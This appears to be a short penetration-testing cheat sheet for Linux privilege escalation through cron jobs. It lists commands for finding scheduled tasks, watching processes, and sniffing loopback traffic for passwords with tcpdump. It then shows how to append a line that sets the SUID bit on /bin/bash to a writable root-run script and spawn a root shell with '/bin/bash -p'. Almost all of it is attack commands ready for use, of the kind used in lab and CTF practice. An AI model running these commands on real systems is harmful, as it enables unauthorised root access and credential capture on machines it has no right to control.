# Checking for cron
```bash
./pspy64
ls -lah /etc/cron*
sudo crontab -l
cat /etc/crontab
grep "CRON" /var/log/syslog
watch -n 1 "ps aux"
watch -n 1 "ps aux | grep pass"
sudo tcpdump -i lo -A | grep "pass"
```
-----------------------

# If full write is accessible to the found script
```bash
echo "chmod u+s /bin/bash" >> /path/to/script.sh

# Wait for our new permission
watch -n 1 "ls -la /bin/bash"

# Once we have our S set
/bin/bash -p
```
